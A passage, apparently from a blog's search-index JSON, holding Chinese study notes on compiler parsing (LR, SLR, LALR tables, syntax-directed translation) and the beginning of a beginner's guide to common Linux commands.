V=+=\u003e…a 或 V =*=\u003e…aQ   如何从文法构造优先关系表 检查文法产生式的每个候选，可找出所有满足 = 的终结符对。\n对于每个非终结符 P 构造两个集合 FIRSTVT(P) 和 LASTVT(P)\nFisrtVt(P) = { a | P =+=\u003e a… 或 P =+=\u003e Qa… ，a ∈ VT ，Q ∈ VN  }\nLastVt(P) = { a | P =+=\u003e …a 或 P =+=\u003e …aQ ，a∈VT ，Q ∈ VN }\n检查每个产生式的候选，若形如 …aP… ，则对任意b ∈ FisrtVt(P) ，我们有 a\u003cb\n若形如 …Pb… ，则对任何a ∈ LastVt(P)，我们有 a\u003eb\n对表达式文法的非终结符构造 FirstVt 和 LastVt 并建立优先关系表\n算符优先分析算法 素短语：这样的一个短语，他至少包含一个终结符，不含比自身更小的素短语\n最左素短语：句型最左边的素短语\n定理：算法优先文法的句型 #N1a1N2a2……NnanNn+1# 的最左素短语是满足如下条件的最左子串 Njaj……NiaiNi+1 ， aj-1 \u003c aj ， aj = aj+1 = ai ， ai \u003e ai+1\n优先函数 LR分析法  LR(K)分析是指自左向右扫描和自下而上的语法分析，且在分析的每一步，只须根据分析栈中当前已移进和归约出的全部文法符号，并至多再向前查看K个输入符号，就能确定相当于某一产生式右部符号的句柄是否已在分析栈的顶部形成。从而也就可以确定所应采取的分析动作（是移进输入符号还是按某产生式进行归约）。   # X1X2 …… Xi …… Xn Xn+1 Xn+2 …… Xn+k Xn+k+1 …… # |-------||----------------| 栈顶 扫描器的缓冲区 扫到Xn+1,向前查看k个符号,来确定是把Xn+1移进栈,还是把Xi…Xn作为句柄进行归约 1) 要归约时，则根据某产生式 U → XiXi+1……Xn 进行归约: #X1X2 …… Xi-1 U Xn+1Xn+2 …… Xn+k …… # 2)要移进时，即把Xn+1进栈，并读入下一符号: #X1X2 …… Xi …… XnXn+1 Xn+2 …… Xn+k …… # |---|\t|---| |-| 栈中Xi 栈顶(Xn+1) 当前扫描符(Xn+2)  LR(0)：表示再每一步分析时都不用向前输入符号 LR(1)：表示再每一步分析时都向前看一个输入符号来决定当前的动作 SLR(1)：表示简单的LR(1)，即只在动作不唯一的地方向前看一个符号，在动作唯一时则不向前看输入符号  LR分析器的逻辑结构及工作流程 如图为LR分析器的逻辑结构，所有LR分析器的总控程序大致相同，只有分析表（即Go-Action表）不相同。\n 规范LR分析表构造法：用此法构造的分析表功能最强而且也适合很多文法，但是实现代价较高 简单LR（即SLR）分析表构造法：比较容易实现的方法，但SLR分析表功能太弱，而且对某些文法可能根本就构造不出相应的SLR分析表 向前LR（即LALR）分析表构造法：这种方法构造的分析表功能介于规范LR分析表和SLR分析表之间。这种表适用于绝大多数的程序语言文法，而且也可以设法有效实现  LR的分析过程 两个栈：状态栈，符号栈\n移进：\n归约：\n接受\u0026报错：\n所以各种LR分析器的最大区别在于其分析表，分析表决定了每一步该如何移进或者归约，直至接受，或者中途报错。\nLR(0)分析表的构造 1.规范句型的活前缀\n**前缀：**一个符号串的前缀是指该串的任意首部(包括ε)。\n​\t例：abc的前缀为：ε，a，ab，abc\n归约时，归约前和归约后的被归约部分与剩余部分合起来仅构成文法的规范句型，而用哪个产生式归约仅取决于当前句型的前面部分；X1X2…Xn[p]，其中Xi为文法的符号，[p]为第p个产生式序号\n 我们把规范句型的这种前端部分的串称为活前缀。实际上，它们恰好是符号栈栈顶形成句柄时符号栈中的内容。  **活前缀：**是指规范句型的一个前缀，这种前缀不含句柄之后的任何符号。\n 这是因为一旦句型的句柄在符号栈顶形成，将会立即被归约之故。所以我们将规范句型具有上述性质（不含句柄之后的任何符号）的前缀称之为活前缀。  在规范归约过程中的任何时候只要已分析过的部分即在符号栈中的符号串为规范句型的活前缀，表明输入串的已被分析过的部分是该文法某规范句型的一个正确部分。\n 定义：若 S=*R⇒ αAω =R⇒ αβω 是文法G的一个规范推导，如果符号串γ是 αβ 的前缀，则称γ是G的一个活前缀。其中S为文法开始符号  LR(0)项目  活前缀和句柄间的关系：\n(1) 活前缀中已含有句柄的全部符合（句柄的最后符号就是活前缀的最后符号）\n(2) 活前缀只含有句柄的前部分符号（句柄的最左子串为活前缀的最右子串）\n(3) 活前缀中全然不包括句柄的任何符号\n (1) 表明：此时某一产生式 A → β 的右部 β 已出现在符号栈顶，因此此时相应的分析动作应当是用此产生式进行归约。\n(2) 表明：形如 A → β1 β2 的产生式的右部子串已在符号栈栈顶了，如 β1 ，正期待着从余留输入串中能看到由β推出的符号串，即期待 β2 进栈以便能进行归约。故此时分析动作是移进当前输入符号\n(3) 表明：期望从余留输入串中能看到某产生式 A → α 的右部，即α所代表的符号串（即句柄），所以此时分析的动作也是读输入符进符号栈。\n在产生式的右部相应位置上加一个圆点 . ，来指示识别位置，标明在 . 前的部分已被识别\n如 (1) A → β. (2) A → β1.β2 (3) A → .α\n右部某位置上标有圆点的产生式称为LR(0)项目(item)。\n不同的LR(0)项目，反映了分析过程中符号栈顶的不同情况。\n每个项目的意义与圆点的位置有关\n圆点左边的子串表示在分析过程的某一时刻用该产生式归约时句柄中已识别过的部分，圆点右边的子串表示待识别的部分\n文法的全部LR(0)项目将是构造他的所有活前缀的有穷自动机的基础\nLR(0)项目的分类  A → α.：表明右部符号串已出现在栈顶，此时相应的分析动作应当是按此产生式进行归约，此种项目称为规约项目。 S' → S.：称为接受项目。 A → α.Xβ：其中α可以为ε，当X为终结符时，相应的分析动作应将当前的符号移入栈中，将此项目称为移进项目。 A → α.Xβ：其中α可以为ε，当X为非终结符时，期待从余留的输入符中进行归约后而得到X，此类项目称为待约项目。  把终结符和非终结符都可看成一个有限自动机的输入符号，每把一个符号进栈相当于已识别过该符号，而状态进行转换（到下一个状态），当识别到可归约前缀时相当于栈顶已形成句柄，则认为达到了识别句柄的终态。、\n==\u003e\u003e\u003e构造识别活前缀的DFA：DFA中的每一个状态由若干个LR(0)项目所组成的集合(称为项目集)来表示。\n举例：构造识别前缀的DFA 用I0表示这个DFA的初态， 将项目S'→.S列入项目集I0。 将项目S→.A和S→.B加入I0中。 将A→.aAb和A→.c和B→.aBb, B→.d加入I0中。 项目集I0将由如下项目组成： I0 : S'→.S, S→.A, S→.B, A→.aAb, A→.c, B→.aBd, B→.d \u003e\u003e\u003e S'→.S称为项目集I0的基本项目，从基本项目出发构造项目集I0的过程，可用closure({S'→.S})表示。 closure(I)的定义: Closure(I) = I ∪ { A → .μ | A → μ∈G ∧ K→ α.Aβ∈closure(I) ∧ α∈V∧β∈V}\n构造closure(I)的算法: 1）I 中的每一个项目都属于 closure(I) 2）若形如 K→α.Aβ 的项目属于I，且 A→μ 是文法的一个产生式，任何形如 A→.μ 的项目也应加到 closure(I) 中 3）重复上述过程，直至不再有新的项目加入到closure(I)中为止。\n如何确定从I0可能转移到的下一状态？\n若I0中有项目 K→a **.**Ab，从输入串识别出A后，进入下一状态。设此状态为 Ii ，显然 Ii 中必含有形如 K→aA .b 的项目，称为 K→a .Ab 的后继项目。后继项目组成集合 J，则J中的每个项目都是项目集 Ii 的基本项目，有： Ii =closure( J )\n定义状态转移函数：GOTO(I,A)=closure(J) 其中，I 是当前状态，A为文法符号，J 是 I 中所有形如K→a**.**Ab的项目之后继项目K→aA**.**b所组成的集合，而closure(J)就是项目集 I（即状态I)关于符号A的后继项目集（即后继状态）。\n将G[S']的全部项目集称为文法G[S']的LR(0)项目集规范族，并记为C=(I0 ，I1 ，I2 ，……，In )\n识别文法G[S']的全部活前缀的DFA为 M = ( C，V，GoTo ， I0 ， Z )\n其中，C：M的状态集，即文法G[S'] 的LR(0) 项目集规范族 I0 ~~~ In\nV：M的字母表，即在M中的所有符号\nGoTo：M的状态转换函数，即上述的GoTo函数\nI0 ：M的唯一初态\nZ：M的终态集，Z ⊂ C 为规范族中所有含有规约项目的那些项目集\n例如下图：\n文法G': (0) S' → S (1) S → A (2) S → B (3) A → aAb (4) A → c (5) B → aBd (6) B → d 如上为一个DFA，通过读入字符进行状态转换，以及在每个状态内进行closure闭包。\nLR(0)分析表构造 要求每一个项目集中的的诸项目不出现下列的情况：\n  （1）移进项目和归约项目并存，即存在移进—归约冲突；\n  （2）多个归约项目并存，即存在归约—归约冲突。\n  ​ 如果一个文法G满足上述条件，也就是它的每个LR(0)项目集中都不含有冲突的项目，则称G为LR(0)文法。\n只有当一个文法是LR(0)文法时，才能对它构造不含冲突动作的LR(0)分析表。\n构造LR(0)分析表的算法为： (1)对于每一项目集Ii中形如A→α.Xβ的项目，且有GO(Ii,X)=Ij, 若X为一终结符号 a 时，则置ACTION[i,a]=Sj; 若X为一非终结符号时，则置GOTO[i,X]=j (2)若Ii中有归约项目A→α. ,设A→α为文法第j个产生式，则对文法的任何终结符和“#”（均记为a）,置ACTION[i,a]=Rj (3)若接受项目S'→S .属于Ii ,则置ACTION[i,#]=acc。 (4)在分析表中,凡不能按上述规则填入信息的元素,均置为“出错”。 如上图的DFA可构造分析表为: ACTION\tGOTO a\tb\tc\td\t#\tS A B 0\tS4\tS5\tS6\t1 2 3 1\tAcc 2\tR1\tR1\tR1\tR1\tR1 3\tR2\tR2\tR2\tR2\tR2 4\tS4\tS5\tS6\t7\t9 5\tR4\tR4\tR4\tR4\tR4 6\tR6\tR6\tR6\tR6\tR6 7\tS8 8\tR3\tR3\tR3\tR3\tR3 9\tS10 10\tR5\tR5\tR5\tR5\tR5 \u003e\u003e\u003e 表中Ri代表用第i个产生式归约,Si代表移进Action表的第i行 分析器的工作过程如下：\n根据输入串当前符号 a 和 分析栈栈顶状态 i 查找分析表应采取的动作：\n1）若ACTION[i,a]=Sj, a∈VT ,则把 a 移进符号栈， j 移进状态栈。\n2）若ACTION[i,a]=Rj，a∈VT 或 # ，则用第j个产生式归约。并将两个栈的指针减去K(其中，K为第j 个产生式右部的串长度），并把产生式的左部符号A压入符号栈，同时用符号对（ Si-k , A )去查GOTO表（其中Si-k 为状态栈当前栈顶元素，若 GOTO[Si-k ,A] = j ,则j压入状态栈，使得两个栈内的元素一样多。\n3）若ACTION[i,a]=Acc,（此时a应为“#”号），则表明分析成功，结束分析。\n4）若ACTION[i,a]=空白，转出错处理。\nSLR分析表构造 大多数程序设计语言的文法不是LR(0)文法。\n对LR(0)规范族中有冲突的项目集（状态）用向前查 看一个（输入）符号的办法进行处理，以解决冲突。即为SLR(1)。\nSLR(1) 分析表构造与LR(0) 分析表构造基本相同\nSLR(1) 之所以是1，是因为向前看了一步Follow集。\n假定有一个LR(0)规范族中含有如下项目集(状态)I: I={X→a.bβ , A→g. , B→d.}其中a,b,g,d为符号串，b∈VT ,I中含有移进—归约和归约—归约冲突。 只要FOLLOW(A)和FOLLOW(B)互不相交，且都不包含b,即: FOLLOW(A)∩FOLLOW(B)=φ FOLLOW(A)∩{b}=φ FOLLOW(B)∩{b}=φ 当状态I面临某输入符号a时，则动作为： 1）若a = b,则移进。 2）若a ∈ FOLLOW(A),则用产生式A→g归约。 3）若a ∈ FOLLOW(B),则用产生式B→d归约。 一般地，对于LR(0)规范族的一个项目集I可能含有多个移进项目和多个归约项目，我们可假设项目集I中有m个移进项目： A1→a1**.** b1b1, A2→ a2**.** b2b2, …, Am→ am**.** bmbm;同时含有n个归约项目：B1→g1**.** , B2→ g2**.** ,…, Bn→ gn**.** ,只要集合{b1, b2,…bm}和FOLLOW(B1),FOLLOW(B2),…,FOLLOW(Bn) 两两交集都为空，则我们仍可用上述归则来解决冲突：\n1）若a∈{b1, b2,…,bm},则移进。\n2）若a∈FOLLOW(Bi),i=1,…,n，则用 Bi→ gi 进行归约。\n3）此外，则报错。\nSLR分析表构造方法 (1) 对于每一项目集Ii中形如A.X的项目，且有GOTO(Ii,X)=Ij, 若X为一终结符号a时，则置ACTION[I,a]=S; 若X为一非终结符号时，则仅置GOTO[i,X]=j；\n(2) 若归约项目A→α**.** 属于Ii,设A→α为文法第j个行产生式，则对任何属于FOLLOW(A)的输入符号a,置ACTION[i,a]=Rj；\n(3) 若接受项目S' → S**.**属于Ii ,则置ACTION[i,#]=acc。\n(4) 在分析表,凡不能按上述规则填入信息的元素,均置为“出错”。\n（例：TODO：后面补充，ppt--Bottom-Up--P42-47）\n规范LR分析表构造 SLR(1) 方法：若状态K含有 A ➡ α. ，若 α ∈ Follow(A) ，则用 A ➡ α.  归约\n当状态Ix下，有产生式A ➡ α.  和A ➡ α. = … ，此时，SLR(0)不知道是将此归约成A还是移进至=，若没有其他情况能产生=，则这里产生移进归约冲突，导致错误！！！\nLR(1)项目 (A→a**.** β，x) 表示： a在栈顶，输入串头部可由βx导出。\nLR(1)的状态：LR(1)项目的集合\n该算法为: 令初态: Closure( (S’→.S，#) ) Closure(I)= repeat for any item( A→α.Xβ ，z) in I for any production X →γ for any w∈FIRST(βz) I←I∪{X → .γ, w} until I does not change GO (I,X)= J ←{} for any item(A→α.Xβ，z) in I add ( A→αX.β，z ) to J return Closure(J) LALR分析表的构造 同心项目集：除去搜索符之外都相同的LR(1)项目集\n合并同心项目集不会产生新的移进-归约冲突\n将 LR(1) 合并同心项目集，如果没有归约-归约冲突，则为LALR(1)文法。\n 参考，各语法分析器的区别\n  各文法的区别：\n LL(1)就是向前只搜索1个符号，即与FIRST()匹配，如果FIRST为空则还要考虑Follow集 \u003e\u003e\u003e见到First集就移进，见到Follow集就归约。 LR(0):见到First集就移进，见到终态就归约 SLR(1)见到First集就移进，见到终态先看Follow集，与Follow集对应的项目归约，其它报错。 \u003e\u003e\u003eSLR分析法包含的展望信息是体现在利用了Follow(A)信息，可以解决“归约－归约”冲突 SLR分析法没有包含足够的展望信息，不能完成解决“移进－归约”冲突，需要改进。 LALR同心集合并不会产生“移进－归约”冲突 ，但会产生“归约－归约”冲突 LR(1)   语法制导的翻译（Syntax-Directed Translation） 一种语义描述方法：语法制导的翻译\n语法制导翻译采用上下文无关文法来引导对语言的翻译，是一种面向文法的翻译技术\n语法制导翻译=语法分析+语义分析+中间代码生成\n语义翻译 = 语义分析 + 中间代码生成\n属性文法 如何表示语义信息？为文法符号设置语义属性，用来表示语法成分对应的语义信息。\n语法制导定义：是对上下文无关文法的推广，将每个文法符号和一个语义属性集合相关联，将每个产生式和一组语义规则相关联，这些用于计算该产生式中各文法符号的属性值\n属性文法定义的形式   基础文法\n  每个文法符号有一组属性\n  每个文法产生式 A ➡ α  有一组形式为 b := f(c1,c2,……,ck) 的语义规则，其中 f 是函数，b和c1,c2,……,ck是该产生式文法符号的属性\n   综合属性：如果b是A的属性，c1,c2……,ck是产生式右部文法符号的属性或A的其他属性\n  继承属性：如果b是产生式右部某个文法符号X的属性\n     文法符号的属性分为：综合属性和继承属性。\n综合属性（Synthesized Attribute） S属性定义：仅仅使用综合属性的语法制导定义\n例：\n语法分析树如下\n分析树的各节点属性的计算自下而上完成\n继承属性（Inherited Attribute） 例：语法规则如下：\n分析树如下：\n分析树的依赖图如下\n其中，L ➡ L1 ，id ； L1.in := L.in；addtype(id.entry , L.in)；\n基于属性文法的处理方法 属性计算次序 拓扑排序：节点的一种顺序，是的边只会从该次序中先出现的节点到后出现的节点\n①构造输入的分析树，②构造属性依赖图，③对节点进行拓扑排序，④按拓扑排序的次序计算属性。\n当然，也可以多次扫描分析树，如果属性文法不存在循环依赖，每次至少会计算出一个属性值，但是编译更偏向于一边扫描的处理方法。\n抽象语法树   语法分析与语义处理阶段分离\n  语法分析树不适合语义处理的因素：\n  提取公共左因子 消除左递归等引入新的产生式和符号、标点等语法要素不含任何语义信息     抽象语法树是语法分析和后续阶段的接口\n  S属性文法的自下而上的计算 将LR分析器增加一个域来保存综合属性值\nL属性文法的自上而下的计算  ---边分析边翻译的方式能否用于继承属性\n属性的计算次序一定受分析方法所限定的分析树结点建立次序的限制\n分析树的节点是自左向右生成\n如果属性信息是自左向右流动，那么有可能在分析的同时完成属性计算。\n L属性的定义 如果每个产生式 A ➡ X1X2…Xn 的每条语义规则计算的属性是A的综合属性；或者Xj (1≤j≤n)的继承属性，但他仅依赖①该产生式中Xj 左边符号 X1X2…Xj-1 的属性；②A的继承属性\n变量类型声明的语法制导定义是一个L属性定义\n翻译方案，例：把有加减的中缀表达式翻译成后缀表达式，如果是8+5-2，则输出8 5 + 2 - \nE ➡ T R R ➡ addop T {print(addop.lexeme)} R1 | ε T ➡ num {print(num.val)} 如 8+5-2可翻译成: E ⇒ T R ⇒ num {print (8)} R ⇒ num{print (8)}addop T{print (+)}R ⇒ num{print(8)}addop num{print(5)}{print (+)}R … {print(8)}{print(5)}{print(+)}addop T{print(-)} R … {print(8)}{print(5)}{print(+)}{print(2)}{print(-)} 预测翻译器的设计 把预测分析器的构造方法推广到翻译方案的实现\n如:产生式R ➡ +TR | ε 的分析过程 procedure R; begin if lookahead = '+' then begin match ('+');T;R; end else begin /*Do nothing*/ end end 语义规则的两种描述方法：属性文法和翻译方案\n S属性的自下而上计算（边分析便计算） L属性的自上而下计算（边分析便计算） L属性的自下而上计算（边分析便计算）  中间代码生成 代码优化 代码改进变换的原则\n  （1）等价原则。经过优化后不应改变程序运行的结果。\n  （2）有效原则。使优化后所产生的目标代码运行时间较短，占用的存储空间较小。\n  （3）合算原则。应尽可能以较低的代价取得较好的优化效果。\n  优化：①公共子表达式删除②复写传播③死代码删除④代码外提⑤强度削弱和归纳变量删除\n基本块：连续的语句序列，控制流从他的开始进入，并从他的末尾离开\n","description":"","tags":["compilier","studyNote"],"title":"Compiler","uri":"/posts/compiler/"},{"categories":["linux"],"content":"Linux Study Note  参考：\n黑马程序员-linux从入门到精通\n Linux系统的文件 linux一切皆文件\n文件操作种类：创建文件、编辑文件、保存文件、关闭文件、重命名文件、删除文件、恢复文件\n文件目录结构 Bin：全称binary，含义是二进制。该目录中存储的都是一些二进制文件，文件都是可以被运行的。\nDev：该目录中主要存放的是外接设备，例如盘、其他的光盘等。在其中的外接设备是不能直接被使用的，需要挂载（类似windows下的分配盘符。\nEtc：该目录主要存储一些配置文件。\nHome：表示“家”，表示除了root用户以外其他用户的家目录，类似于windows下的User/用户目录。\nProc：process，表示进程，该目录中存储的是Linux运行时候的进程。\nRoot：该目录是root用户自己的家目录。\nSbin：全称super binary，该目录也是存储一些可以被执行的二进制文件，但是必须得有super权限的用户才能执行。\nTmp：表示“临时”的，当系统运行时候产生的临时文件会在这个目录存着。\nUsr：全称是User Software Resource，注意不是user的缩写。存放的是用户自己安装的软件。类似于windows下的program files。\nVar：存放的程序/系统的日志文件的目录。\nMnt：当外接设备需要挂载的时候，就需要挂载到mnt目录下。\nLinux的基本指令 linux指令指在linux终端（命令行）中输入的内容。\n一个完整的指令的标准格式：Linux通用的格式\n1  #指令主体 (空格) [选项] (空格) [操作对象]   一个指令可以包含多个选项，操作对象也可以是多个。\n1.ls指令 含义：ls（list）\n用法1：#ls 含义：列出当前工作目录下的所有文件/文件夹的名称\n用法2：#ls\t路径 含义：列出指定路径下的所有文件/文件夹的名称\n路径分为相对路径和绝对路径\n用法3：#ls\t选项\t路径 含义：在列出指定路径下的文件/文件夹的名称，并以指定的格式进行显示。\n常见的语法：\n1 2  #ls -l 路径 #ls -la 路径   选项解释：\n​ -l：表示list，表示以详细列表的形式进行展示\n​ -a：表示all，显示所有的文件/文件夹（包含了隐藏文件/文件夹）\n上述列表中的第一列表示文档类型，其中 “ - ” 表示改行对应的文档类型为文件，“ d ” 表示文档类型为文件夹。\n在Linux中，隐藏文档一般以 “ . ” 开头。\n用法4：#ls\t-lh\t路径 含义：列出指定路径下的所有文件/文件夹的名称，以列表的形式并且在显示文档大小的时候以可读性较高的形式显示\nls列出的结果颜色说明，其中蓝色的名称表示文件夹，黑色的表示文件，绿色的其权限为拥有所有权限\n2.pwd指令 用法：#pwd\t（print working directory，打印当前工作目录）\n3.cd指令 命令：#cd\t（change directory，改变目录）\n作用：用于切换当前的工作目录\n语法：#cd\t路径 P.S. 在linux中有一个特殊符号~，用于表示当前用户的家目录\n4.mkdir指令 指令：mkdir\t（make directory，创建目录）\n语法1：#mkdir\t路径 路径，可以是文件夹名称也可以是包含名称的一个完整路径\n假如是文件夹名称，则在当前目录下创建该文件夹\n语法2：#mkdir\t-p\t路径 含义：当一次性创建多层不存在的目录的时候，添加-p参数，否则会报错\n语法3：#mkdir\t路径1\t路径2\t路径3\t... 表示一次性创建多个目录\n5.touch指令 作用：创建文件\n语法：#touch\t文件路径\n路径可以是直接的文件名也可以是路径\n一次性创建多个文件\n6.cp指令 指令含义：cp\t（copy，复制）\n作用：复制文件/文件夹到指定位置\n语法：#cp\t被复制的文档路径\t文档被复制到的路径 简单来说就是#cp\t源地址\t目的地址\n注意：Linux在复制过程中是可以重新对新位置的文件进行重命名的，但是如果不是必须的需要，则建议保持前后名称一致。\n当使用cp命令进行文件夹复制操作的时候需要添加选项“-r”（-r表示递归复制），否则目录将被忽略\n7.mv指令 指令含义：mv\t（move，移动，剪切）\n作用：移动文档到新的位置\n语法：#mv\t需要移动的文件路径\t需要保存的位置路径 注：在Linux中重命名的命令也是mv，语法和移动语法一样。\n8.rm指令 指令含义：rm\t（remove，移除，删除）\n语法：#rm\t选项\t需要移除的文件路径 选项：\t-f：force，强制删除，不提示是否删除\n​\t-r：表示递归\n在删除的时候如果不带选项，会提示是否删除，如果需要确认则输入“y/yes”，否则输入\n注意：如果在删除的时候不想频繁的确认，则可以在指令中添加选项“-f”，表示force（强制）。\n删除一个文件夹：\n注意：删除一个目录的时候需要做递归删除，并且一般也不需要进行删除确认询问，所以移除目录的时候一般需要使用-rf选项。\n删除多个文件：\n删除一个目录下具有公共特性的文件，例如都以Linux开头\n其中***称之为通配符，意思表示任意的字符，Linux*，则表示只要文件以Linux开头，后续字符则不管**。\n9.vim指令 指令：vim\t（Vim是一款文本编辑器，号称编辑器之神）\n语法：#vim\t文件路径 作用：可以打开一个文件，文件不存在时，可以创建该文件\nvim其他用法参考本文后续。\n10.输出重定向 一般命令的输出都会显示在终端中，有些时候需要将一些命令的执行结果想要保存到文件中进行后续的分析/统计，则这时候需要使用到的输出重定向技术。\n\u003e：覆输出，会覆盖掉原先的文件内容\n\u003e\u003e：追加输出，不会覆盖原始文件内容，会在原始内容末尾继续添加\n语法：#正常执行的指令 \u003e / \u003e\u003e文件的路径 注意：文件可以不存在，不存在则新建\n11.cat指令 作用1：cat有直接打开一个文件的功能。\n语法1：#cat\t文件的路径 作用2：cat还可以对文件惊醒合并\n语法2：#cat\t待合并的文件路径1\t待合并的文件路径2\t...\t文件路径n\t\u003e\t合并之后的文件路径 12.df指令 作用：查看磁盘空间\n语法：#df\t-h -h表示以较高可读性的形式展示大小\n13.free指令 作用：查看内存使用情况\n语法：#free\t-m -m表示以mb为单位查看\n剩余的真实可用的内存为1665mb。\nSwap：用于临时内存，当系统真实内存不够用的时候可以临时使用磁盘空间来充当内存。\n14.head指令 作用：查看一个文件的前n行，若不指定n，则默认显示前10行。\n语法：#head\t-n\t文件路径 n表示数字\n15.tail指令 作用1：查看一个文件的末n行，如果n不指定，则默认显示后10行\n语法：#tail\t-n\t文件路径 n表示数字\n作用2：可以通过tail指令来查看一个文件的动态变化内容（变化的内容不能是用户手动添加的）\n语法：#tail\t-f\t文件路径 该命令一般用于查看系统的日志比较多\n16.less指令 作用：查看文件，以较少的内容进行输出，按下辅助功能键（数字+回车，空格键+上下方向键）查看更多\n语法：#less\t需要查看的文件路径 退出的时候只需要按下q键\n17.wc指令 作用：统计文件内容信息（包含行数、单词数、字节数）\n语法：#wc\t-lwc\t需要统计的文件路径 -l：表示lines，行数\n-w：表示words，单词数，依照空格来判断单词数量\n-c：表示bytes，字节数\n18.date指令 作用：表示操作时间日期（读取、设置）\n语法1：#date 输出的形式：2019年8月24日\t星期六\t20:13:14\n语法2：#date\t+%F\t（等价于\t#date\t\"+%Y-%m-%d\"） 输出形式：2019-08-24\n语法3：#date\t\"+%F %T\"\t（等价于\t#date\t\"+%Y-%m-%d\t%H:%M:%S\"） 引号表示让“年月日与时分秒”成为一个不可分割的整体\n输出的形式：2019-08-24\t20:13:14\n语法4：#date\t-d\t\"-1 day\"\t\"+%Y-%m-%d %H:%M:%S\" 用于获取之前或者之后的某个时间（备份）\n符号的可选值：+（之后）、-（之前）\n单位的可选值：day（天）、month（月份）、year（年）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64  %F：表示完整的年月日 %T：表示完整的时分秒 %Y：表示四位年份 %m：表示两位月份（带前导0） %d：表示日期（带前导0） %H：表示小时（带前导0） %M：表示分钟（带前导0） %S：表示秒数（带前导0） (以下摘自#date --help) %%\t一个文字的 % %a\t当前locale 的星期名缩写(例如： 日，代表星期日) %A\t当前locale 的星期名全称 (如：星期日) %b\t当前locale 的月名缩写 (如：一，代表一月) %B\t当前locale 的月名全称 (如：一月) %c\t当前locale 的日期和时间 (如：2005年3月3日 星期四 23:05:25) %C\t世纪；比如 %Y，通常为省略当前年份的后两位数字(例如：20) %d\t按月计的日期(例如：01) %D\t按月计的日期；等于%m/%d/%y %e\t按月计的日期，添加空格，等于%_d %F\t完整日期格式，等价于 %Y-%m-%d %g\tISO-8601 格式年份的最后两位 (参见%G) %G\tISO-8601 格式年份 (参见%V)，一般只和 %V 结合使用 %h\t等于%b %H\t小时(00-23) %I\t小时(00-12) %j\t按年计的日期(001-366) %k hour, space padded ( 0..23); same as %_H %l hour, space padded ( 1..12); same as %_I %m month (01..12) %M minute (00..59) %n\t换行 %N\t纳秒(000000000-999999999) %p\t当前locale 下的\"上午\"或者\"下午\"，未知时输出为空 %P\t与%p 类似，但是输出小写字母 %r\t当前locale 下的 12 小时时钟时间 (如：11:11:04 下午) %R\t24 小时时间的时和分，等价于 %H:%M %s\t自UTC 时间 1970-01-01 00:00:00 以来所经过的秒数 %S\t秒(00-60) %t\t输出制表符 Tab %T\t时间，等于%H:%M:%S %u\t星期，1 代表星期一 %U\t一年中的第几周，以周日为每星期第一天(00-53) %V\tISO-8601 格式规范下的一年中第几周，以周一为每星期第一天(01-53) %w\t一星期中的第几日(0-6)，0 代表周一 %W\t一年中的第几周，以周一为每星期第一天(00-53) %x\t当前locale 下的日期描述 (如：12/31/99) %X\t当前locale 下的时间描述 (如：23:13:48) %y\t年份最后两位数位 (00-99) %Y\t年份 %z +hhmm\t数字时区(例如，-0400) %:z +hh:mm\t数字时区(例如，-04:00) %::z +hh:mm:ss\t数字时区(例如，-04:00:00) %:::z\t数字时区带有必要的精度 (例如，-04，+05:30) %Z\t按字母表排序的时区缩写 (例如，EDT)   19.cal指令 作用：用来操作日历的\n语法1：#cal\t（等价于#cal\t-l） 直接输出当前月份日历\n语法2：#cal\t-3 表示输出上一个月+本月+下个月的日历\n语法3：#cal\t-y\t年份 表示输出某一个年份的日历\n20.clear | (ctrl+L) 指令 作用：清除终端中已经存在的命令和结果（信息）\n语法：#clear\t或 快捷键 ctrl + L 注意：该命令并不是真的清除了之前的信息，而是把之前的信息都隐藏到了最上面，可以通过滚动条继续查看以前的信息。\n21.管道pipe 管道符：\t| 作用：管道一般可以用于“过滤”，“特殊”，“扩展处理”\n语法：管道不能单独使用，必须需要配合前面的指令一起使用，起作用主要是辅助作用 ①过滤案例（高频率使用）：需要通过管道查询出根目录下包含“y”字母的文档名称。\n1 2 3 4 5  #ls\t| grep y 针对上面这个命令说明： ①以管道作为分界线，前面的命令有个输出，后面需要先输入，然后再过滤，最后再输出，通俗的讲就是管道前面的输出就是后面指令的输入； ②grep指令：主要用于过滤   ②特殊用法案例：通过管道的操作方法来实现less的等价效果（了解）\n之前通过less查看一个文件，可以#less 路径\n现在通过管道还可以这么：#cat 路径|less\n③扩展处理：统计某个目录下的文档的总个数？\n答：#ls / | wc -l\n22.hostname指令 作用：操作服务器的主机名（读取or设置）\n语法1：#hostname 含义：表示输出完整的主机名\n语法2：#hostname\t-f\n含义：表示输出当前主机名中的FQDN（全限定域名）\n23.id指令 作用：查看一个用户的一些基本信息（包含用户id，用户组id，附加组id...），该指令如果不指定用户则默认当前用户。\n语法1：#id 默认显示当前执行该命令的用户的基本信息\n语法2：#id\tusername 显示指定账户（username）的基本信息\n验证用户信息可通过文件（/etc/passwd）\n验证用户组信息可通过文件（/etv/group）\n24.whoami指令 作用：“我是谁？”，显示当前登录的用户名，一般用于shell脚本，用于获取当前操作系统的用户名方便记录日志。\n语法：#whoami 25.ps -ef指令 指令：ps\n作用：用于查看服务器进程信息\n选项含义：\n​\t-e：等价于“-A”，表示列出全部的进程\n​\t-f：显示全部的列（显示全字段）\n各列的含义： UID：该进程执行的用户id； PID：进程id； PPID：该进程的父级进程id，如果一个程序的父级进程找不到，该程序的进程称之为僵尸进程（parent process ID）； C：Cpu的占用率，其形式是百分数； STIME：进行的启动时间； TTY：终端设备，发起该进程的设备识别符号，如果显示“?”则表示该进程并不是由终端设备发起； TIME：进程的执行时间； CMD：该进程的名称或者对应的路径 #ps\t-ef\t|\tgrep\t\"进程名称\" 用于查看特定进程的状态\n26.top指令 作用：查看服务器的进程占用的资源\n语法：进入命令：#top（动态显示） 退出命令：按下q键 表头含义： PID：进程id； USER：该进程对应的用户； PR：优先级； VIRT：虚拟内存； RES：常驻内存； SHR：共享内存； 计算一个进程实际使用的内存 = 常驻内存（RES）- 共享内存（SHR） S：表示进程的状态status（sleeping，其中S表示睡眠，R表示运行）； %CPU：表示CPU的占用百分比； %MEM：表示内存的占用百分比； TIME+：执行的时间； COMMAND：进程的名称或者路径 在运行top命令时，可以有如下快捷键：\nM：表示将结果按照内存（MEM）从高到低进行降序排列\nP：表示将结果按照CPU使用率从高到低进行降序排列\n1：当服务器拥有多个CPU的时候可以使用“1”快捷键来切换是否展示显示各个cpu的详细信息\n27.du -sh指令 